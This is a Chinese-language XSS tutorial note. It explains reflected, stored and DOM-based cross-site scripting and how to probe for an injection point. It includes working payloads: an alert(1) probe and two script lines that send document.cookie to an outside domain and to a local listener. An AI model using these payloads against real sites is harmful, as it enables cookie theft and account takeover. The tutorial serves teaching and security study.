我们的 XSS 攻击利用了我们的 JavaScript 语言，把我们的**原本的文本信息**，解析为了我们的**脚本语言**, 从而导致我们的用户在**连接网站的时候**，产生了对应的错误。

也就是让别的用户**执行了**我们预先写好的**JS 代码**。而这里我们为什么能让别的用户执行，就是一个好的问题了。

而因此，我们能够实现的功能，就是取决于，**我们的 JS 代码**可以完成什么。

## 常见形式：
`反射型XSS攻击原理：` 攻击者发送给被攻击者一个邮件信息或者链接，当被攻击者点击并访问该链接时，此时就会向攻击者的目标服务器发起请求，此时根据请求返回相关的 `script` 代码，当浏览器解析这些 `script` 代码时，此时代码就会在浏览器执行，造成用户被攻击。  **也就是说，只有我们的用户主动访问我们的对应网站的时候，我们的攻击才会生效**。

`下面我们看一个小例子`，模拟一下 `xss` 攻击。

![[Pasted image 20240509132133.png]]

当我们访问一个网站时，此时如果攻击者在该网站上设置了一个恶意连接，此时当我们点击该链接时，就会向攻击者服务器发起请求，返回对应的脚本，此时当浏览器加载该脚本文件时，就会出现 `token` 或者 `cookie` 等信息的泄漏。

`存储型XSS攻击` 是持久性攻击方式，因为该攻击的代码会提交到服务器中的数据中进行保存。此时我们可以看一个例子：比如说存在一个博客网站，每一个用户都可以在该博客网站上发表博客。此时当用户写入了一些 `js` 代码例如：

```
<script>window.open("http://www.fordldmc.com?params=" + document.cookie)</script>
```

此时如果不加处理，就会保存在服务器的数据库中，此时当其他用户访问该博客时，用户的浏览器就会执行这段 script 代码，此时本地的 `cookie` 就会发送到 `http://www.fordldmc.com` 这个网址上，造成 cookie 泄漏。攻击者就会拿到 cookie 冒充用户身份，登录账号。  


我们的客户端的 js 可以对 DOM 节点进行动态的操作，比如插入，修改页面的内容。比如说客户端从 url 中提取数据并且在本地执行，如果用户在客户端输入的数据包含了恶意的 js 脚本的话，但是这些脚本又没有做过任何过滤处理的话，那么我们的应用程序就有可能受到 `DOM-based XSS` 攻击，因此 DOM 型 XSS 攻击步骤如下。  
`1、`攻击者构造出特殊的`url`，其中包含恶意代码。  
`2、`用户打开带有恶意代码的url。  
`3、`用户浏览器接收到响应后解析执行，前端取出恶意代码并执行。  
`4、`恶意代码窃取用户数据并且发送到攻击者的网站，冒充用户的行为。  
`DOM-based xss`和之前两种xss攻击的区别，`DOM-based xss`是前端的漏洞，但是前面两个是服务器的漏洞。  
下面看一下简单案例：  
![在这里插入图片描述](https://img-blog.csdnimg.cn/d8e1d9bbc21f44b8ab93acb2d33c97d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2W6I-c55qE5bCP55m9,size_20,color_FFFFFF,t_70,g_se,x_16)
## 位点：
我们的 XSS 的位点检测一般来说是在下面的几个条件：
1. 我们输入什么，就返回什么

在这个时候，我们可以考虑使用 `p>` 来闭合，然后再在我们的之后写一个对应的内容，例如：
```
p><script>alert(1)</script>
```

最后，如果我们回显：`1`，那么就说明我们当前已经得到了一个 xss 漏洞。

## 获取信息：
1. 获取我们的当前页面的 cookie,**并且把信息带出**，这个时候，我们只需要在本机上监听对应的单口即可。
```
p><script>window.location.href("http://127.0.0.1:1234?q="%2bdocument.cookie")</script>
```

